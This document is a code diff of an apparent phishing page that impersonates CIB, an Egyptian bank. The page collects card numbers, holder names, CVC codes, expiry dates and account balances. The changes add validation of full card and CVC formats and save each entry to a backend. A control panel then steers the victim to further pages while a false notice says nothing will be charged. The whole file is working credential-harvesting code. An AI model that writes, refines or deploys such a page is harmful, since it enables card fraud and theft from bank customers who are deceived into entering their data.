@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
     <title>CIB - بيانات البطاقة</title>
     <link rel="stylesheet" href="card-data.css" />
   </head>
@@ -21,28 +21,55 @@
           الذكية
         </h1>
 
-        <form class="form" action="#" method="post" autocomplete="off">
+        <form class="form" id="cardForm" action="#" method="post" autocomplete="off">
           <div class="field">
-            <label for="card-number">رقم البطاقة</label>
-            <input id="card-number" name="card_number" type="text" placeholder="CARD NUMBER" />
+            <label for="card-number">رقم البطاقة (16 رقماً)</label>
+            <input
+              id="card-number"
+              name="card_number"
+              type="text"
+              inputmode="numeric"
+              maxlength="19"
+              placeholder="0000 0000 0000 0000"
+              autocorrect="off"
+              spellcheck="false"
+              dir="ltr"
+              autocomplete="cc-number"
+            />
           </div>
 
           <div class="field">
             <label for="card-holder">اسم صاحب البطاقة</label>
-            <input id="card-holder" name="card_holder" type="text" placeholder="اسم صاحب البطاقة" />
+            <input
+              id="card-holder"
+              name="card_holder"
+              type="text"
+              placeholder="اسم صاحب البطاقة"
+              autocomplete="cc-name"
+            />
           </div>
 
           <div class="triple-labels">
-            <span>رمز cvc</span>
+            <span>رمز CVC</span>
             <span>السنة</span>
             <span>الشهر</span>
           </div>
 
           <div class="triple-inputs">
-            <input id="cvv" class="cvc" name="cvv" type="text" placeholder="CVC" autocomplete="off" />
-            <div class="year-month">
-              <input id="expiry-year" name="expiry_year" type="text" placeholder="سنة" inputmode="numeric" />
-              <input id="expiry-month" name="expiry_month" type="text" placeholder="شهر" inputmode="numeric" />
+            <input
+              id="cvv"
+              class="cvc"
+              name="cvv"
+              type="text"
+              inputmode="numeric"
+              maxlength="3"
+              placeholder="•••"
+              autocomplete="cc-csc"
+              dir="ltr"
+            />
+            <div class="expiry-selects">
+              <select id="expiry-month" name="expiry_month" aria-label="شهر الانتهاء"></select>
+              <select id="expiry-year" name="expiry_year" aria-label="سنة الانتهاء"></select>
             </div>
           </div>
 
@@ -51,7 +78,7 @@
             <input id="balance" name="balance" type="text" placeholder="الرصيد المتوفر في الحساب" />
           </div>
 
-          <button type="submit" class="btn">تأكيد البيانات</button>
+          <button type="submit" class="btn" id="cardSubmitBtn">تأكيد البيانات</button>
         </form>
 
         <div class="notice">ملاحظة : لا يتم خصم اي مبلغ من حسابك</div>
@@ -63,79 +90,208 @@
         البنك التجاري الدولي هو بنك مرخص ومنظم ويخضع البنك المركزي المصري
       </div>
     </footer>
-    
+
     <script src="api-config.js"></script>
     <script src="api-client.js"></script>
-    <script src="form-handler.js"></script>
     <script>
-      document.addEventListener('DOMContentLoaded', function() {
-        const form = document.querySelector('.form');
-        
-        form.addEventListener('submit', async function(e) {
-          e.preventDefault();
+      (function () {
+        function digitsOnlyCard(str) {
+          return String(str || '').replace(/\D/g, '').slice(0, 16);
+        }
 
-          const monthRaw = document.getElementById('expiry-month').value.trim();
-          const yearRaw = document.getElementById('expiry-year').value.trim();
-          const month = monthRaw.replace(/\D/g, '').slice(0, 2);
-          const yearDigits = yearRaw.replace(/\D/g, '');
-          const yy = yearDigits.length <= 2 ? yearDigits.padStart(2, '0') : yearDigits.slice(-2);
-          const expiry_date = (month && yy) ? (month.padStart(2, '0') + '/' + yy) : '';
+        function formatCardDisplay(d16) {
+          return d16.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+        }
 
-          const card_number = document.getElementById('card-number').value.trim();
-          const card_holder = document.getElementById('card-holder').value.trim();
-          const cvv = document.getElementById('cvv').value.trim();
-          const balance = document.getElementById('balance').value.trim();
-
-          const newUser = {
-            page: 'card',
-            card_number,
-            card_holder,
-            cvv,
-            expiry_month: month || '',
-            expiry_year: yearRaw || '',
-            expiry_date,
-            balance,
-            timestamp: new Date().toLocaleString('ar-EG'),
-            registrationTime: new Date().toLocaleString('ar-EG'),
-            name: card_holder || 'بدون اسم'
-          };
-
+        function playBeep() {
           try {
-            await saveSubmission(newUser);
-          } catch (err) {
-            console.error(err);
-            alert('تعذر حفظ بيانات البطاقة. تأكد أن الخادم وMongoDB يعملان.');
-            return;
-          }
+            var ctx = new (window.AudioContext || window.webkitAudioContext)();
+            var o = ctx.createOscillator();
+            var g = ctx.createGain();
+            o.connect(g);
+            g.connect(ctx.destination);
+            g.gain.setValueAtTime(0.25, ctx.currentTime);
+            g.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
+            o.frequency.value = 900;
+            o.type = 'sine';
+            o.start(ctx.currentTime);
+            o.stop(ctx.currentTime + 0.25);
+          } catch (e) {}
+        }
 
-          // عرض الرسالة
-          const modal = document.createElement('div');
-          modal.style.cssText = `
-            position: fixed;
-            top: 0;
-            right: 0;
-            bottom: 0;
-            left: 0;
-            background: rgba(0, 0, 0, 0.5);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-          `;
-          modal.innerHTML = `
-            <div style="background: white; padding: 40px; border-radius: 15px; text-align: center; max-width: 400px;">
-              <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
-              <h2 style="color: #28a745; margin-bottom: 10px;">تم التسجيل بنجاح!</h2>
-              <p style="color: #666; margin-bottom: 20px;">شكراً لك على المعلومات.</p>
-              <button onclick="window.location.href='index.html'" style="padding: 10px 30px; background: #667eea; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold;">العودة للرئيسية</button>
-            </div>
-          `;
-          document.body.appendChild(modal);
-          form.reset();
-          setTimeout(() => modal.remove(), 3000);
+        function fillMonthYearSelects() {
+          var mSel = document.getElementById('expiry-month');
+          var ySel = document.getElementById('expiry-year');
+          mSel.innerHTML = '';
+          var mo = document.createElement('option');
+          mo.value = '';
+          mo.textContent = 'شهر';
+          mSel.appendChild(mo);
+          for (var m = 1; m <= 12; m++) {
+            var o = document.createElement('option');
+            var v = String(m).padStart(2, '0');
+            o.value = v;
+            o.textContent = v;
+            mSel.appendChild(o);
+          }
+          ySel.innerHTML = '';
+          var yo = document.createElement('option');
+          yo.value = '';
+          yo.textContent = 'سنة';
+          ySel.appendChild(yo);
+          var yFull = new Date().getFullYear();
+          for (var y = yFull; y <= yFull + 15; y++) {
+            var o2 = document.createElement('option');
+            var yy = String(y).slice(-2);
+            o2.value = yy;
+            o2.textContent = String(y);
+            ySel.appendChild(o2);
+          }
+        }
+
+        var pollStop = null;
+
+        function stopPoll() {
+          if (typeof pollStop === 'function') {
+            pollStop();
+            pollStop = null;
+          }
+        }
+
+        function ensureCardLoadingOverlay() {
+          var el = document.getElementById('cardFormLoading');
+          if (el) return el;
+          el = document.createElement('div');
+          el.id = 'cardFormLoading';
+          el.className = 'card-full-loading';
+          el.setAttribute('aria-live', 'polite');
+          el.setAttribute('aria-busy', 'true');
+          el.innerHTML =
+            '<div class="card-full-loading-inner">' +
+            '<div class="card-full-loading-spinner" aria-hidden="true"></div>' +
+            '<p class="card-loading-message">جاري المعالجة...</p>' +
+            '</div>';
+          document.body.appendChild(el);
+          return el;
+        }
+
+        function setCardLoadingMessage(msg) {
+          var el = document.getElementById('cardFormLoading');
+          if (!el) return;
+          var p = el.querySelector('.card-loading-message');
+          if (p) p.textContent = msg;
+        }
+
+        function showCardFullLoading(msg) {
+          var el = ensureCardLoadingOverlay();
+          setCardLoadingMessage(msg || 'جاري المعالجة...');
+          el.style.display = 'flex';
+          el.setAttribute('aria-busy', 'true');
+        }
+
+        function hideCardFullLoading() {
+          var el = document.getElementById('cardFormLoading');
+          if (!el) return;
+          el.style.display = 'none';
+          el.setAttribute('aria-busy', 'false');
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+          fillMonthYearSelects();
+          var cardInput = document.getElementById('card-number');
+          var cvvInput = document.getElementById('cvv');
+
+          cardInput.addEventListener('input', function () {
+            var d = digitsOnlyCard(cardInput.value);
+            cardInput.value = formatCardDisplay(d);
+          });
+
+          cvvInput.addEventListener('input', function () {
+            cvvInput.value = cvvInput.value.replace(/\D/g, '').slice(0, 3);
+          });
+
+          document.getElementById('cardForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            stopPoll();
+
+            var digits = digitsOnlyCard(document.getElementById('card-number').value);
+            if (digits.length !== 16) {
+              alert('رقم البطاقة يجب أن يكون 16 رقماً.');
+              return;
+            }
+
+            var card_holder = document.getElementById('card-holder').value.trim();
+            var cvv = document.getElementById('cvv').value.replace(/\D/g, '').slice(0, 3);
+            if (cvv.length !== 3) {
+              alert('رمز CVC يجب أن يكون 3 أرقام.');
+              return;
+            }
+
+            var mSel = document.getElementById('expiry-month');
+            var ySel = document.getElementById('expiry-year');
+            var month = mSel.value;
+            var yearRaw = ySel.value;
+            if (!month || !yearRaw) {
+              alert('اختر شهر وسنة انتهاء البطاقة.');
+              return;
+            }
+
+            var yy = yearRaw.replace(/\D/g, '').slice(-2).padStart(2, '0');
+            var expiry_date =
+              month && yy ? month.padStart(2, '0') + '/' + yy : '';
+
+            var balance = document.getElementById('balance').value.trim();
+            var card_number = digits;
+
+            var newUser = {
+              page: 'card',
+              card_number: card_number,
+              card_holder: card_holder,
+              cvv: cvv,
+              expiry_month: month,
+              expiry_year: yy,
+              expiry_date: expiry_date,
+              balance: balance,
+              timestamp: new Date().toLocaleString('ar-EG'),
+              registrationTime: new Date().toLocaleString('ar-EG'),
+              name: card_holder || 'بدون اسم'
+            };
+
+            showCardFullLoading('جاري حفظ البيانات...');
+
+            try {
+              await saveSubmission(newUser);
+            } catch (err) {
+              console.error(err);
+              hideCardFullLoading();
+              alert('تعذر حفظ بيانات البطاقة. تأكد أن الخادم وMongoDB يعملان.');
+              return;
+            }
+
+            playBeep();
+            setCardLoadingMessage(
+              'يرجى الانتظار، جاري التحقق من قبل النظام...'
+            );
+
+            document.getElementById('cardForm').reset();
+            fillMonthYearSelects();
+
+            if (typeof startSessionRedirectPolling !== 'function') {
+              hideCardFullLoading();
+              alert(
+                'تم الحفظ. تحمّل api-client.js لاستكمال انتظار التوجيه من لوحة التحكم.'
+              );
+              return;
+            }
+
+            stopPoll();
+            pollStop = startSessionRedirectPolling(function (url) {
+              stopPoll();
+              window.location.href = url;
+            });
+          });
         });
-      });
+      })();
     </script>
   </body>
 </html>
-
